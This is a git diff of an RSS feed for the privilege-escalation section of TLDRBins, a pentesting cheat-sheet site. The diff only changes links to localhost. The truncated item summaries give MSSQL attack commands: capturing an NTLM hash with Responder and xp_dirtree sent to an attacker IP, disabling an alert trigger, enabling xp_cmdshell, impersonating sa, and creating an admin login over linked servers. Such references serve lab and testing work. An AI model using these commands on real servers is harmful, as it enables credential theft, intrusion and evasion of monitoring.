@@ -2,23 +2,23 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Privilege Escalation on TLDRBins</title>
-    <link>https://tldrbins.github.io/@privilege-escalation/</link>
+    <link>http://localhost:1313/@privilege-escalation/</link>
     <description>Recent content in Privilege Escalation on TLDRBins</description>
     <generator>Hugo</generator>
     <language>en-us</language>
-    <atom:link href="https://tldrbins.github.io/@privilege-escalation/index.xml" rel="self" type="application/rss+xml" />
+    <atom:link href="http://localhost:1313/@privilege-escalation/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>MSSQL Linked Servers</title>
-      <link>https://tldrbins.github.io/mssql_linked_server/</link>
+      <link>http://localhost:1313/mssql_linked_server/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/mssql_linked_server/</guid>
+      <guid>http://localhost:1313/mssql_linked_server/</guid>
       <description>Linked Servers Basic Commands Hint: Use double &#39;&#39; to escape &#39; in mssql&#xA;# Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE (&amp;#39;select @@version;&amp;#39;) at [DOMAIN\LINKED_SERVER]; # Execute query from linked server to current server EXECUTE (&amp;#39;EXECUTE (&amp;#39;&amp;#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;&amp;#39;&amp;#39;&amp;#39;SERVER&amp;#39;&amp;#39;&amp;#39;&amp;#39;);&amp;#39;&amp;#39;) at [DOMAIN\CURRENT_SERVER]&amp;#39;) at [DOMAIN\LINKED_SERVER]; Privilege Escalation Create Admin User from Privilege Linked Server EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;CREATE LOGIN test WITH PASSWORD = &amp;#39;&amp;#39;&amp;#39;&amp;#39;Test1234!</description>
     </item>
     <item>
       <title>MSSQL Privilege Escalation</title>
-      <link>https://tldrbins.github.io/mssql_privilege_escalation/</link>
+      <link>http://localhost:1313/mssql_privilege_escalation/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/mssql_privilege_escalation/</guid>
+      <guid>http://localhost:1313/mssql_privilege_escalation/</guid>
       <description>Steal NTLM hash # In our local Linux machine sudo responder -I tun0 # Inside mssql terminal xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Impersonate sa to run xp_cmdshell execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;show advanced options&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; EXEC master.</description>
     </item>
   </channel>
